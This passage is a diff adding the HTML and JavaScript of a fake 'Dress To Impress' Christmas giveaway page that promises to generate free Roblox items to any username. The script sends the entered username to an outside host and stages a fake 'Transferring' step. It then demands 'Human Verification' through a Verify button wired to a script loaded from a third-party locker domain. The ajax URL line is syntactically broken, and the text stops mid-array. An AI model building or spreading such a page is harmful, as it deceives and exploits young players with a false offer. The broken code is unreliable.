@@ -1,1 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dress To Impress</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css"  />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+  <script type="text/javascript" id="ogjs" src="https://areyourealhuman.com/cl/js/j6kern"></script>
+    <style>
+        @font-face {
+            font-family: 'Refinery 95';
+            src: url('https://dress2.pages.dev/fonts/refinery-95-regular.ttf') format('truetype');
+        }
+        body {background-image: radial-gradient(circle, rgba(204,25,31,1) 0%, rgb(115, 1, 7) 100%);background-repeat: no-repeat;background-size: cover;background-position: center;background-attachment: fixed; font-family: 'Refinery 95';color: #fff;font-weight: bold;}
+        .top-img {position: fixed;top: 0;left: 0;right: 0;width: 100%;z-index: 88;}
+        .bottom-img {position: fixed;bottom: 0;left: 0;right: 0;width: 100%;z-index: 88;}
+        #particles-js {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        /* background-color: #000; Dark background to contrast with snow */
+        z-index: -888;
+        }
 
+        .logo {display: flex;justify-content: center;align-items: center;margin-top: 80px;}
+        .logo img {width: 290px;margin: 25px auto;}
+
+        .container-md {padding: 0 50px;}
+
+        .item {position: relative;margin: 10px 0;text-align: center;}
+        .item.active img {box-shadow: 0px 0px 20px 4px rgb(215, 179, 2);}
+        .item .cap {position: absolute;left: 50%;transform: translate(-50%);display: none;}
+        .item img {width: 100%;border-radius: 50%;}
+        .item .title {margin-top: 9px;margin-bottom: 10px;    text-shadow: 2px 2px 9px #c8be00;}
+
+
+        .folding {
+  margin: 20px auto;
+  width: 70px;
+  height: 70px;
+  position: relative;
+  transform: rotateZ(45deg);
+}
+
+.square {
+  position: absolute;
+  top: 30%;
+  right: 30%;
+  width: 30px;
+  height: 30px;
+  background-color: crimson;
+  transform: rotateZ(87deg);
+}
+.folding .sk-cube {
+  float: left;
+  width: 50%;
+  height: 50%;
+  position: relative;
+  transform: scale(1.1);
+}
+
+.folding .sk-cube:before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #fff;
+  animation: sk-foldCubeAngle 2.4s infinite linear both;
+  transform-origin: 100% 100%;
+}
+
+.folding .sk-cube2 {
+  transform: scale(1.1) rotateZ(90deg);
+}
+
+.folding .sk-cube3 {
+  transform: scale(1.1) rotateZ(180deg);
+}
+
+.folding .sk-cube4 {
+  transform: scale(1.1) rotateZ(270deg);
+}
+
+.folding .sk-cube2:before {
+  animation-delay: 0.3s;
+}
+
+.folding .sk-cube3:before {
+  animation-delay: 0.6s;
+}
+
+.folding .sk-cube4:before {
+  animation-delay: 0.9s;
+}
+
+@keyframes sk-foldCubeAngle {
+  0%,
+  10% {
+    transform: perspective(140px) rotateX(-180deg);
+    opacity: 0;
+  }
+  25%,
+  75% {
+    transform: perspective(140px) rotateX(0deg);
+    opacity: 1;
+  }
+  90%,
+  100% {
+    transform: perspective(140px) rotateY(180deg);
+    opacity: 0;
+  }
+}
+
+
+        .mode {background-color: rgba(0,0,0,.7);position: fixed;top: 0;left: 0;right: 0;bottom: 0;z-index: 8888;display: flex;justify-content: center;padding: 60px 20px;overflow: scroll;}
+        .mode-1 {background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAsS5QyE1w8pnK5v8mmHpWqGiTKsmOJrWJ6WpGPpqHDVhSar1r2XK6k1h2H3ZcmWMeTElRdOydA2LE68ov1bK0yxobCLmgm9qj9TwOX9FKfAWy-sWmkIZCVbW3RVPGMljb7z_-iOn4yiv9LOLvQ8TMsVPnJ5oFwxn_rDGKyqtFwxoR_Q3oYip57hxYihA/w416-h640/649_Mesa-de-trabajo-1-copia-3.jpg);background-repeat: no-repeat;background-position: center;background-size:cover; max-width: 450px; padding: 20px;z-index: 10000;border-radius: 6px; border: 3px solid #eecc9f;right: 20px;left: 20px;position: absolute;margin: 0 auto;}
+        .mode-1 .cap {position: absolute;width: 80px;right: -20px;top: -56px;transform: rotate(13deg);}
+        .mode-1 .can {width: 30px;position: absolute;}
+        .mode-1 .can-1 {left: -10px;top: -10px;transform: rotate(-45deg);}
+        .mode-1 .can-2 {left: -10px;bottom: -10px;transform: rotate(-125deg);}
+        .mode-1 .can-3 {right: -10px;bottom: -10px;transform: rotate(125deg);}
+        .mode-1 .logo {width: 75%;margin: 0 auto;}
+        input {margin-top: 20px;width: 100%;margin-bottom: 10px;padding: 10px 20px;border-radius: 30px;border: 2px solid #eecc9f;}
+        .btn-action {display: flex;justify-content: center;margin-top: 20px;margin-bottom: 30px;user-select: none;}
+        .btn-action .item-btn {position: relative;}
+        .btn-action .item-btn img {width: 180px;}
+        .btn-action .item-btn .text {position: absolute;left: 50%;transform: translateX(-50%);bottom: 17px;font-size: 1.3rem;white-space: nowrap;text-transform: uppercase;}
+        .step {text-align: center;}
+        .heart {position: absolute;left: 50%;transform: translateX(-50%);bottom: -40px;}.heart .txt {position: absolute;left: 50%;transform: translateX(-50%);bottom: 20px;z-index: 8888;font-size: 9rem;}
+        .heart img {width: 75px;}
+        .user-error {color: rgb(240, 236, 18);font-size: .8rem;}
+        .avatar {width: 90px;height: 90px;border-radius: 50%;background-color: #fff;margin-bottom: 8px;}
+
+        .message {position: fixed;bottom:65px;left: 15px;background-color: red;display: flex;font-size: .8rem; align-items: center;padding: 10px 20px;border-radius: 6px;background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAsS5QyE1w8pnK5v8mmHpWqGiTKsmOJrWJ6WpGPpqHDVhSar1r2XK6k1h2H3ZcmWMeTElRdOydA2LE68ov1bK0yxobCLmgm9qj9TwOX9FKfAWy-sWmkIZCVbW3RVPGMljb7z_-iOn4yiv9LOLvQ8TMsVPnJ5oFwxn_rDGKyqtFwxoR_Q3oYip57hxYihA/w416-h640/649_Mesa-de-trabajo-1-copia-3.jpg);background-repeat: no-repeat;background-position: top;background-size:cover;border: 2px solid #eecc9f;z-index: 9999;}
+        .message .img img {width: 50px; background: #fff;border-radius: 50%;height: 50px;}
+        .message .img {padding-right: 10px;}
+        .message .border-img {position: absolute;width: 70px;right: -10px;top: -13px;}
+
+        .pc-img {display: none;}
+        
+        @media  (min-width: 800px) {
+            .top-img {display: none;}
+            .bottom-img {display: none;}
+            .container-md {max-width: 750px;}
+            .logo {margin-top: 15px;}
+            .message {bottom: 10px;}
+            
+            .pc-img {display: block;}
+            .pc-img-1 {position: fixed;left: 0px;top: 0px;width: 300px;}
+            .pc-img-2 {position: fixed;top: 0;right: 0;width: 300px;}
+        }
+    </style>
+</head>
+<body>
+
+
+    <img class="top-img" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHZR3r_4nMLscGu9kd_xSTaJCZO9Nj_a0Iv9A5rCVs8dEfu7Puv1MhAg8Iojhm1SVIexF3I2OCBoNoOrpApxJpWcn3YD5FupiOL8OyPOsC2WK8ScBy4yqdVclcHgXvsTyRKXVwwC_cRZ-I3xpbBlMWoA9d7I-7Sst4id3dLqVx9CUajT6OFKnrduRZ45U/w640-h160/pngegg%20(3).png" alt="">
+    <img class="bottom-img" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBo3Wj-kp3KjsEEOQDbyA8Y9o3onsaLiTlmoKPzfA5o8RDwznlfBNwCQ2a-xyFqWAW6O95Y5VyFqqjJqkDixafPKNIStxwa6ilgv9EXmnKMW4gbsCSnF1LlM-783h-u5t9-r-W6Bx4hrqoUmHpNw7u1b2_8W9xte2OF97MEQBguM79X66vWlVKTrpQS8k/s16000/pngegg%20bottom.png" alt="">
+    
+    <img class="pc-img pc-img-1" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXH_n6mZx9SzsMUiWl4_F4rqtRDSktj5K9Q2OarsATlK20tLHraG4q83Nb4plmcUdWBRJ6BgoSwuhbyqtke_YC6zmggwBmlmlH63-dY9hN-2-00ZSqERfJG_nUrhhj6etuQ-EvKlfwbsKWFBmSTaiRT3cPXiFBL37RnLjTNu4oCiidAF1o4mPuiMrRvNQ/s320/pngfind.com-christmas-background-png-1121258.png" alt="">
+    <img class="pc-img pc-img-2" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEir37IIthsYBFvB8IcDT-L2-a9TbK1cc6MAHaKRnj64YPR_bQOe5AnOd2qv92wykMOxAMG082Bj0ETKupuDZtAEXyN4wPx3VyDfEF2CW5ogMEydpe-k0E4hyphenhyphenjT2SjdWaxvuP8Rm09F0DQLPCKjyOfOIec_khbpNghVQkPvsNAbcRUyfgQWrryNgJ0zKwSE/s320/pngfind.com-christmasleftttttttttt.png" alt="">
+    <div id="particles-js"></div>
+
+    <audio src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" controls="" id="audio" class="d-none"></audio>
+
+
+    <div class="cliameds"></div>
+
+
+    <div class="mode d-none" id="steps">
+        <div class="mode-1 animate_animated animate_bounceIn">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCOi-L93EtTPGCqUqZStu0LvZmd-p6Y1WeNEhxOE2Ot1DiHxhfZkLc36A_WZaOhePjA3nGbb0Cj8ts1WjH0qbdXWCeYXrtqiW0Jp5r4dPvAy9vELoj-8_SfEI7caIClh8huvwZgu2L3YnNcf_6EQIkVTGPtzdNqkGt3TbUkDtOJwlBSEYH5jGDcpSs2NY/w200-h200/%5BCITYPNG.COM%5DVector%20Santa%20Hat%20And%20Christmas%20Red%20Ornament%20Ball%20PNG%20-%201500x1500.png" alt="" class="cap">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheqTROvZlozrjXSetN0GL4yIko4vxq-BYf4kwU9CL4fAqFzPdrvTf1PWA2Ke4Q6qF-zFTzlYQshCA_Z7uEftKnNPoI1KGc4ZH9nGaRXFOYq8wnx6Yv9cotbhU0B1bdmPUaMUyKmBjGtvbsKe4Rwm6CyaMpOO0nMZjhyf6JyQAKMwCf3UcPCBbU6kxhNpU/w200-h200/6715d8e5abca2.png" alt="" class="can can-1">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheqTROvZlozrjXSetN0GL4yIko4vxq-BYf4kwU9CL4fAqFzPdrvTf1PWA2Ke4Q6qF-zFTzlYQshCA_Z7uEftKnNPoI1KGc4ZH9nGaRXFOYq8wnx6Yv9cotbhU0B1bdmPUaMUyKmBjGtvbsKe4Rwm6CyaMpOO0nMZjhyf6JyQAKMwCf3UcPCBbU6kxhNpU/w200-h200/6715d8e5abca2.png" alt="" class="can can-2">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheqTROvZlozrjXSetN0GL4yIko4vxq-BYf4kwU9CL4fAqFzPdrvTf1PWA2Ke4Q6qF-zFTzlYQshCA_Z7uEftKnNPoI1KGc4ZH9nGaRXFOYq8wnx6Yv9cotbhU0B1bdmPUaMUyKmBjGtvbsKe4Rwm6CyaMpOO0nMZjhyf6JyQAKMwCf3UcPCBbU6kxhNpU/w200-h200/6715d8e5abca2.png" alt="" class="can can-3">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhT96yBQd3vAEWYUgkm4Wt9RIU3UjtTcRco7J7vdga5p_BXQ4BlzhM03e0-pUac29jrGdrIiqtNyB7qwu8oJDryCKlcMB50O-kF7pS2JNjz193Hy6hUfEEHs6aHtwbzt0QCd3vX6S5ByFP0yKWS_YRTeGgoW5Mpwmaly0-q0o_mCXkxVxfn0Uq0CD-malo/s16000/Christmas_Event.png" alt="" class="logo">
+            <div class="step" id="step-1">
+                <input type="text" placeholder="Enter Your Username" id="username">
+                <div class="user-error d-none">Plase enter correct useraneme </div>
+                <div class="btn-action">
+                    <div class="item-btn">
+                        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRLj82BIWhAXhD0nMglJtxYPI_scDBdT9Mj4co80XfShmeNHd_6sne7Q5gKmknUS5dxSnfWEXmNNqnI3ccMC9gygNtp4v48FAoi6KsxvUeKvM2fM0uNAnQPg8ppk2js0_5JOcJnkVwXa87fND_20f6bcD-xssRGlYkXg8yltB1pUUpiaY8Nz2VbvLJMXE/s320/christmas-web-button-covered-with-snow-icon-vector-19667569-removebg-preview.png" alt="">
+                        <div class="text user-search" >Next Step</div>
+                    </div>
+                </div>
+            </div>
+            <div class="step animate_animated animate_bounceIn d-none" id="step-2">
+                <br>
+                <div class="folding">
+                    <div class="sk-cube1 sk-cube"></div>
+                    <div class="sk-cube2 sk-cube"></div>
+                    <div class="sk-cube4 sk-cube"></div>
+                    <div class="sk-cube3 sk-cube"></div>
+                    <div class="square"></div>
+                </div>
+                <div class="searching mb-4 mt-3">Searching for <span class="username">nnn</span></div>
+            </div>
+            <div class="step animate_animated animate_bounceIn d-none" id="step-3">
+                <br>
+                <div class="user">
+                    <img class="avatar" src="" alt="">
+                    <div class="userinfo">@<span class="username"></span></div>
+                </div>
+                <div class="btn-action">
+                    <div class="item-btn">
+                        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRLj82BIWhAXhD0nMglJtxYPI_scDBdT9Mj4co80XfShmeNHd_6sne7Q5gKmknUS5dxSnfWEXmNNqnI3ccMC9gygNtp4v48FAoi6KsxvUeKvM2fM0uNAnQPg8ppk2js0_5JOcJnkVwXa87fND_20f6bcD-xssRGlYkXg8yltB1pUUpiaY8Nz2VbvLJMXE/s320/christmas-web-button-covered-with-snow-icon-vector-19667569-removebg-preview.png" alt="">
+                        <div class="text continue" >Continue</div>
+                    </div>
+                </div>
+            </div>
+            <div class="step animate_animated animate_bounceIn d-none" id="step-4">
+                <br>
+                <div class="loading">
+                    <div class="folding">
+                        <div class="sk-cube1 sk-cube"></div>
+                        <div class="sk-cube2 sk-cube"></div>
+                        <div class="sk-cube4 sk-cube"></div>
+                        <div class="sk-cube3 sk-cube"></div>
+                        <div class="square"></div>
+                    </div>
+                </div>
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgd7ApC8iQLWuT_iK1Lzxv_-usivLnGX1NCtp-u8n_ehkxUIVTxpawDWH7OeBqWhCRmD5OU7girLhCaiyqwcNLzOzLheIynKaTyhxy-UTgm1AlSJeZdrFVyc4V6qpzard56WijOUeHtcfw1JrAftxLIwdEQC6FlYsBYlzBbUKMRIV_LABp6Y07Stp7ungM/w200-h200/%E2%80%94Pngtree%E2%80%94a%20robot%20with%20christmas%20gift_14160147.png" alt="" class="img-robot d-none">
+                <div class="searching mb-4 mt-2">Transferring <span class="item-text"></span> to <span class="username">nnn</span></div>
+                <div class="action d-none">
+                    <div class="btn-action" style="margin-bottom: -55px;">
+                        <div class="item-btn">
+                            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRLj82BIWhAXhD0nMglJtxYPI_scDBdT9Mj4co80XfShmeNHd_6sne7Q5gKmknUS5dxSnfWEXmNNqnI3ccMC9gygNtp4v48FAoi6KsxvUeKvM2fM0uNAnQPg8ppk2js0_5JOcJnkVwXa87fND_20f6bcD-xssRGlYkXg8yltB1pUUpiaY8Nz2VbvLJMXE/s320/christmas-web-button-covered-with-snow-icon-vector-19667569-removebg-preview.png" alt="">
+                            <div class="text " onclick="_uG()">Verify</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="heart">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIzO8IPiRnGpmS09bSE9ctn-Ltef45DY_BZSTm64_dZJMWgmOywgxHfSJXtgCCoomcQZJLe2Is0pKsO2Sk7gMOO-UMRq4_0C33WFtli7tYh84wlIqXKryykKQQ9u9BpaWkbjuZObPQKEMPTVB7MbhzIZE15pcucVxYElUOq4dMsLUkOrBUrZ184coGCpg/s1600/Untitled-1-01.png" alt="">
+            </div>
+        </div>
+    </div>
+    
+    <div class="logo">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhT96yBQd3vAEWYUgkm4Wt9RIU3UjtTcRco7J7vdga5p_BXQ4BlzhM03e0-pUac29jrGdrIiqtNyB7qwu8oJDryCKlcMB50O-kF7pS2JNjz193Hy6hUfEEHs6aHtwbzt0QCd3vX6S5ByFP0yKWS_YRTeGgoW5Mpwmaly0-q0o_mCXkxVxfn0Uq0CD-malo/s16000/Christmas_Event.png" alt="">
+    </div>
+ 
+
+    <div class="container-md">
+        <p class="text-center">Select an item you wish to generate to your Roblox account:</p>
+        <div class="row">
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <img class="cap" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXxo4Jo5v-citlpaW5-Y7ul3T4ulUBR6881AWEkKKDUkjEbBMHkRL6RZbu1j1uIT18CMo4SbgzmQlOcWEjSlP0e1ULFLqopgiokOkSuXoWjFS3tmVTaccaKjjn2cNWYpBc4RJZeYFnyCkvFmp_rK0ye5aKTbSn-Yofit2I1u6QzDOYtYOQjHt8tUKOGNc/s320/pngwing.com%20(9).png" alt="">
+                        <div class="img"><img class="active" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRxdhdeGtfQiFyXJSVf6vPBZgv_N-El6W_COVazeKc1Vonra7pABX2-FxdY_jqXRqOVp7oVDy0AL6Vtgi_ozNcKUm-Xv4iXbivNI89OZEPaRRy1yeSewwINOpYn_3Jt4XFpcpiBg3DV5gJ2qO5ugrNBC_RhHx4qIKp9loJ8Z4ddTMtGcE_q-zJF4Doajc/s320/makeup.webp" alt=""></div>
+                        <div class="title">Custom Makeup</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhReCGKVj8ar-zrVEWd1bd_A0Ky-9jlfV83sGcNoXnksgLTOTvcj26YBbQMOlaX4yLqEntPZMmTsKW-7hW68CLwSXynt0Ne6G-7DbaNxDzQtNi5lzx2CmQzrjN7hgCArpAraQlz6nInj1oqQefADhnKhyphenhyphenUDLcSi1EXQ0jdrLUk8PqDtZ8pKiQcsGlk29AA/s320/vip.png" alt=""></div>
+                        <div class="title">VIP Access</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgF4pU2WfDx83VNmy9xoKzymzIexcdi42gOcBSuC9wBQxCenG0Anl81ZeYepUMrjBrugOBqQzkFw37rVGqtR9JY0-A38LANjiHElNiNzlowGk0pVdoFPzPrLQEBB6JLh_d-kiRmj2R0OnYiAIUhuym66k663BgRmotrARN0BxpIlzj2luxOoaKtKuGppMY/s320/x2money.png" alt=""></div>
+                        <div class="title">x2 money</div>
+                    </div>
+                </div>
+    
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiID2-yji_dZVNCZpvCGZ7l_t5ZynZaNvygSSOwQCuaieQxgT_xsaezMrI7_gbh161tCmYIcvX1d2rqIBQrj-AZpADoOt3zFCwuF1AUACkMBk_Ls42ZQdeMiafg1tbHju-q7xMOBULfcqK1Qy0HWi5gmN4MJmZl5At0QBb1h65kY_VZEWakJziTZlTAVS0/s320/itemlimit.png" alt=""></div>
+                        <div class="title">+6 Item Limit</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLvITLpHPNe2THdtHKq7HnTjPwVCeQ9mKmfxrev3UBGZMLhelpU8JaHBZ2cp7_8pj6ftGCQzWUleIJw6EPKeA29EBJiBgK3oMPieddQFPaM3c058Jf1JgYGkjwFNgya7p9ib3X32vDNtZ9fTOIr-mHeRS_OzBzsXCA7VWD36V8wjqI2AeS5HMEp0J2sFk/s320/rainbow.png" alt=""></div>
+                        <div class="title">Rainbow Skin</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ1kNBDC0Tvccro-G6Lk5k4n6qP1qm4pfN4V-BA8kwehu_qkwgdd3KxUQIBSOZjsiQl0IaL2cGBzmjZliOrYE5xc1NJ5lLDJp2GJ70587gZhU8YB4_XB9PxJVHy195xmp5imD4qGggFQaW8My85T7uT-0TVG8-TX1M8WPkgOXA5UmWMTh5FAmUbaSAg6c/s320/walk.webp" alt=""></div>
+                        <div class="title">Fast Walk</div>
+                    </div>
+                </div>
+    
+    
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMz2379VZuO_-Xs8gUu1X1bpgklf1nR1oxZaYvY71ows448nLxtjnu7hqBIOYjp2zGRTQzwqd8e4vAtdOrT9fczmvtItkuOWQ5H8KYM0PpvOQyn7ZVMdeswIGUeLZGXj88rg-DShopEVl0XF6hpSDsCBl2NCRNXSvxcyitb_kFcfP8FW5icc7upS2JmKQ/s320/topmodel.png" alt=""></div>
+                        <div class="title">Top Model Rank</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVnItHN7cfBHNgsMcXrqfC19q9Nf04wfYPNndb2RQW-uO2dqNg1sr0QQwuZT71SWltJpI_uZe4AYrN8AVArslywlyd709aU93lLpR_sbLDsnFQ8TmH17v4hEuoNsb40gD-4iR3jBDeXcHs0Q8GWZH1Jpnm1ZtcTbzgLkHmRP6pE6dp5KtNRB4Jnn_bITQ/s320/diva.png" alt=""></div>
+                        <div class="title">Runway Diva Rank</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLXCyXqGGyWVleQl2ZXadQbv9AUm_UdqOVYtOxpFe3kjGyDvZOVvIL5LbeZCjbZ2SU063y9ge9h2xh61d4plf5ssuiepmpSTxL2uBQUTBoh_KV5fh_NnbVMK7SXbRoH3oBmXfX24dCZaV9HUM_ZbVOHwNrBvULJ0ZtEhGe7y_uPXo-kL8Yu_iqHG8UkA4/s320/money.webp" alt=""></div>
+                        <div class="title">35,000 Tokens</div>
+                    </div>
+                </div>
+    
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgm9SpbKei0cnmkm8ckFBv26al-YH4eIJmghkr3lO-39-FfzqoDSl2pqGKzQfTVHjcsvAgjmKdHdijUXqwEttZA11pW3Kzem-13s3zbNZkCETjJmySUxa9MQPUYTpE0DMZRX5iDqRLB4TEr_JkdzIF8-_enMs2yzPIuSioCIUzsa3owqKf3mJBSAcWKspU/s320/luxury.webp" alt=""></div>
+                        <div class="title">Luxury Dress</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgH4PjWNYAnbQLhncJp4-iC5EBP1XqlKUCAMgp_SYyxDquYtDY6HjE7gjNsefjTApG7ZdlF0BpSv-BXEEe2ixhCnzpRe4Je7IuHQBOMKNwfNZYXfESg-4jxphdA4myFPk-MS3D1tFGHSYWGkvuvv1o4IuJLctIx3eHiVtrPKgPVFlQ-xuazDhoP0u41RnQ/s320/moon.png" alt=""></div>
+                        <div class="title">Moongazer Girl Set</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjaZ8wkI6c0wdVHNIEhmRxhkfPd18yZ_ofmWsunuYYYoMfdA2F9bcKXw_qMSP5BI84r3B9FdgEhMuDShCg9LS_pi6ujip-ugyQpvrlCujQL6BAoaa1PGprPTYwK457YnQn0DRakn5THpKuuL9Gr-0l3U1BQLtr8ycZeE8vhXbS0jSD5PKMq0x4a87cRovE/s320/Futuristi.webp" alt=""></div>
+                        <div class="title">Futuristic Suit</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8UO6m9pbEfk2TDCwEHr9HonAUl7N0shNdXjFnSbNdaAhorkg0XKO5o85zeIkFQvOuFWM2o75wf76q5FOeBUBaVDs2t1OxJCkmMk2RvWB3vyaEPCuBVjOk-z2u2r6NhKpntS6jnQTBvTArCZ4HtiRvTNMIo7lfqwdQlOXHJ3xH2pqatqobUr4cwJFvKgg/s320/denim.webp" alt=""></div>
+                        <div class="title">Denim Bag</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpYX4bw3FFmCWZLIIxmS55ECROOlMr3PEN15Tzu_azjmwqGVlgMMWJMi364bQzAJG3SBugWurRLydZRkJQlHO_e9L6L8_TrXdaKK46PCZH9E667GTPo0cQMOUCfttIaa1otvycK9MX-F1A5f4bx0NHQWfVCxaLplx0ZP-qnLo5aqEgEVAXcwuBpM4QIYM/s1600/french.png" alt=""></div>
+                        <div class="title">French Luxury Bag</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPxb-_lCT17LA2jxnLz_sxilRCWSXEcuanb-31RbzFmL_XlKG1ZAx3vfijTML1N0SMZFkLIywq0hYL6rOhAp6c3stzTGL776fbqjpUGfQdZqCyYNG0tRFMdzosNt_ZXYPZxpDpkb_hR0YU1mthjAb9trUbOeJ7e7z0dPUHH5PX9N8JcvqHIF-zVEF_cNc/s320/rich.png" alt=""></div>
+                        <div class="title">Rich Girl Bag</div>
+                    </div>
+                </div>
+            </div>
+            
+
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+    
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" ></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script>
+        particlesJS("particles-js", {
+          particles: {
+            number: { value: 150, density: { enable: true, value_area: 800 } },
+            color: { value: "#ffffff" }, // Snow is white
+            shape: { type: "circle" }, // Snowflakes are round
+            opacity: {
+              value: 0.8,
+              random: true // Some snowflakes are more transparent
+            },
+            size: {
+              value: 5,
+              random: true // Random sizes for variety
+            },
+            line_linked: {
+      enable: false,
+    },
+            move: {
+              enable: true,
+              speed: 2, // Slow falling snow
+              direction: "bottom", // Falling down
+              random: false,
+              straight: false,
+              out_mode: "out" // Snowflakes disappear when out of view
+            }
+          },
+          interactivity: {
+            detect_on: "canvas",
+            events: {
+              onhover: { enable: false }, // No interactivity for snow
+              onclick: { enable: false }
+            }
+          },
+          retina_detect: true
+        });
+
+        var audio = $("#audio").get(0);
+
+
+        $(".item").on("click", function(){
+            audio.play();
+            $("#steps").removeClass("d-none");
+            $("span.item-text").text($(this).text());
+        });
+
+        $(".heart").on("click", function(){
+            audio.play();
+            $("#steps").addClass("d-none");
+            $(".step").addClass("d-none");
+            $("#step-1").removeClass("d-none");
+            $("#username").val("");
+        });
+
+        $(".continue").on("click", function(){
+            audio.play();
+            $("#step-3").addClass("d-none");
+            $("#step-4").removeClass("d-none");
+            $(".heart").addClass("d-none");
+            setTimeout(function(){
+                $(".searching").text("Human Verification needed to carry on...");
+                $(".img-robot").removeClass("d-none");
+                $(".loading").addClass("d-none");
+                $(".action").removeClass("d-none")
+            }, 3000);
+        });
+
+        $(".user-search").on("click", function(){
+            audio.play();
+            var username = $("#username").val();
+            $("span.username").text(username);
+            $("#step-1").addClass("d-none");
+            $("#step-2").removeClass("d-none");
+            $(".user-error").addClass("d-none");
+
+
+            $.ajax({
+                url: https://abadaoucht.com/tiktok/api/roblox/userinfo/${username},
+                type: "GET",
+                success: function(profileData) {
+                    var res = profileData;
+                    if(res["status"] == "SUCCESS"){
+                        user_data = res; 
+                        $("#step-2").addClass("d-none");
+                        $("#step-3").removeClass("d-none");
+                        $(".avatar").attr("src", user_data["avatar"]); // Avatar and more infos
+                    }else if(res["status"] == "ERROR_USER"){
+                        $(".user-error").removeClass("d-none");
+                        $("#step-1").removeClass("d-none");
+                        $("#step-2").addClass("d-none");
+                    }
+                },
+                error: function() {
+                    console.log("Failed to fetch profile information.");
+                }
+            });
+
+        });
+
+
+
+
+        const avatars = ['https://dress2.pages.dev/avatars/avatar1.png', 'https://dress2.pages.dev/avatars/avatar2.png', 'https://dress2.pages.dev/avatars/avatar3.png', 
+                     'https://dress2.pages.dev/avatars/avatar4.png', 'https://dress2.pages.dev/avatars/avatar5.png', 'https://dress2.pages.dev/avatars/avatar6.png', 
+                     'https://dress2.pages.dev/avatars/avatar7.png', 'https://dress2.pages.dev/avatars/avatar8.png', 'https://dress2.pages.dev/avatars/avatar9.png', 
+                     'https://dress2.pages.dev/avatars/avatar10.png'];
+
+        const items = ['VIP Access', 'Custom Makeup', 'Fast Walk', 'Top Model Rank', 'Runway Diva Rank',
+                    '35,000 Tokens', 'Luxury Dress', 'Moongazer Girl Set', 'Futuristic Suit', 'Denim Bag'];
+
+        const usernames = [
